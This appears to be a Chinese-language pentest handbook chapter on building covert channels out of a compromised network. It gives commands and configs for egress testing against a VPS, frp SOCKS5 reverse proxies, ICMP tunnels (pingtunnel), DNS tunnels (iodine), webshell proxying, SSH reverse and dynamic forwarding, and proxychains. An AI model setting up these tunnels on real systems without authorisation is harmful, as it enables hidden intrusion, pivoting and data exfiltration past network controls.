# 第3章 通道构建

## 出网协议判断

先判断 DNS、TCP、UDP、ICMP、HTTPS 哪些协议真正可达，不要用 DNS 解析成功等同于 TCP 出网。

- TCP：访问自建 HTTP 服务的 80/443/高位端口，确认服务端日志。
- HTTPS：测试 SNI、Host、证书和目标访问策略。
- UDP：用 `nc -lu` 或 PowerShell UDP 脚本验证。
- ICMP：用 `ping -s/-l` 指定包大小，在服务端抓包。
- DNS：用 `nslookup`/`dig` 指向自建 DNS 监听器。

## 反向代理

- frp：`frps` 在公网，`frpc` 在目标侧，可配置 TCP/KCP/WebSocket 和 SOCKS5。
- ICMP 隧道：pingtunnel/spp，适合仅 ICMP 出网的环境。
- DNS 隧道：iodine，速度慢、特征明显，仅作为最后手段。
- v2ray：可搭建反向代理和正向代理。

```ini
# frpc 示例（授权测试环境）
[common]
server_addr = VPS_IP
server_port = 443
token = CHANGE_ME
protocol = tcp

[proxy]
type = tcp
remote_port = 10000
plugin = socks5
plugin_user = CHANGE_ME
plugin_passwd = CHANGE_ME
```

## 正向代理

- Neo-reGeorg：Webshell 型代理，注意页面特征和请求参数。
- goproxy：`proxy.exe socks -t tcp -p 0.0.0.0:10800`。
- 端口复用：protoplex 做 HTTP/TLS 与 SOCKS 流量分流。
- SSH 隧道：`ssh -D 10800` 建立 SOCKS。
- openvpn/v2ray：按授权范围和端口映射使用。

## 使用代理

- Proxifier 适合图形化程序。
- proxychains 适合 Linux 命令行程序。
- 多级代理按“外层在前”的顺序配置。
- 不要将代理账号、密码和真实业务凭据混在同一配置中。
## 命令速查

### 出网判断

```bash
# TCP/HTTP
curl -v http://<VPS>:<PORT>/<UNIQUE_PATH>
# HTTPS/SNI
curl -vik --resolve <DOMAIN>:443:<VPS> https://<DOMAIN>/<UNIQUE_PATH>
# UDP
nc -lu <PORT>
# ICMP
tcpdump -i any "icmp[icmptype]=icmp-echo and greater 200 and less 210"
ping -c 2 -s 200 <VPS>
# DNS
dig @<VPS> <DOMAIN>
```

### frp

```ini
# frpc 示例；server_addr 为 VPS
[common]
server_addr = <VPS>
server_port = 443
token = <TOKEN>
protocol = tcp
tls_enable = false

[<NAME>]
type = tcp
remote_port = 10000
plugin = socks5
plugin_user = <USER>
plugin_passwd = <PASSWORD>
use_compression = true
use_encryption = true
```

```bash
./frps -t <TOKEN> -p 443
./frpc -c <CONFIG>
```

### ICMP / DNS / SSH

```bash
# pingtunnel 端口转发
pingtunnel.exe -type client -l 127.0.0.1:18443 -s <VPS> -t <VPS>:443 -tcp 1 -noprint 1 -nolog 1

# iodine DNS 隧道
iodined -f -c -P <PASSWORD> 192.168.99.1 t1.<DOMAIN>
iodine -f -P <PASSWORD> -T TXT t1.<DOMAIN>

# SSH 动态代理
ssh -C -f -N -g -D 10800 <USER>@<HOST>
ssh -C -f -N -g -R 1022:127.0.0.1:22 <USER>@<VPS>
ssh -C -f -N -g -D 10800 <USER>@127.0.0.1 -p 1022
```

### proxychains

```ini
# /etc/proxychains.conf
socks5 <PROXY_IP> <PORT>
# 带认证
socks5 <PROXY_IP> <PORT> <USER> <PASSWORD>
```

```bash
proxychains <COMMAND>
```
